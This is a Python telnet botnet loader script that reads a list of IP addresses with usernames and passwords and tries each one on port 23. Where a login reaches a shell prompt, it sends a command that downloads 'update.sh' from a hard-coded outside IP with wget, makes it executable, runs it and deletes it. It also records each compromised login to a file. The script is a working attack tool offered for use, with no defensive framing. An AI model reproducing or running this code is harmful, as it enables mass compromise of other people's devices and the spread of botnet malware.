#!/usr/bin/python3
# SleepTheGod Super Fast Loader Even Faster Than Milenko

import sys
import os
import asyncio
from time import sleep
from threading import Thread

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python3 " + sys.argv[0] + " [vuln list]")

rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.82.70.225/update.sh; busybox wget http://80.82.70.225/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh"
print("\033[31m")

print("S-S-SUUUPER fast telnet loader by Milenko")
print("\nReads ip:user:pass and checks IP for port 23.")
print("Then loads the botnet onto it and saves logins with SSH running to 'telnetopen.txt'")
print("It is VERY fast and extremely efficient.")
print("As it splits the file into equal chunks for each thread!")

# Set the number of threads to double the number of CPU cores
threads = os.cpu_count() * 2  

# Open the file in binary mode and decode lines, ignoring errors
with open(sys.argv[1], "rb") as f:
    lines = [line.decode("utf-8", errors="ignore").strip() for line in f.readlines()]

fh = open("telnetopen.txt", "a+")
loaded = 0

def printStatus():
    global loaded
    while True:
        sleep(10)
        print("\033[32m[\033[31m+\033[32m] Total IPs loaded: " + str(loaded) + "\033[37m")
        if loaded >= 1000:
            print("Dayum u got sum phat hax brah :^}")

async def haxit(ip, username, password):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=1.0)

        # Sending username
        writer.write((username + "\n").encode("ascii"))
        await writer.drain()

        # Sending password
        writer.write((password + "\n").encode("ascii"))
        await writer.drain()

        # Check for prompt symbol to confirm access
        prompt = await reader.read(1024)
        if b"$" in prompt or b"#" in prompt:
            writer.write((rekdevice + "\n").encode("ascii"))
            await writer.drain()
            print("\033[32m[\033[31m+\033[32m] Command Sent: " + ip + "\033[37m")
        writer.close()
    except Exception as e:
        pass

async def check(login):
    global loaded
    try:
        ip, username, password = login.split(":")
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=0.37)
        writer.close()
        print("\033[32m[\033[31m+\033[32m] " + login + " has telnet open. Loading...")
        await haxit(ip, username, password)
        with open("telnetopen.txt", "a+") as fh:
            fh.write(login + "\n")
        loaded += 1
    except Exception as e:
        pass

async def main():
    tasks = [check(login) for login in lines]
    await asyncio.gather(*tasks)

print("STARTING SCAN AND LOAD!!!")
# Start the status printing thread
Thread(target=printStatus).start()

# Run the main async function
asyncio.run(main())

print("Scanning... Press enter 3 times to stop.")
for _ in range(3):
    input()

os.system("kill -9 " + str(os.getpid()))
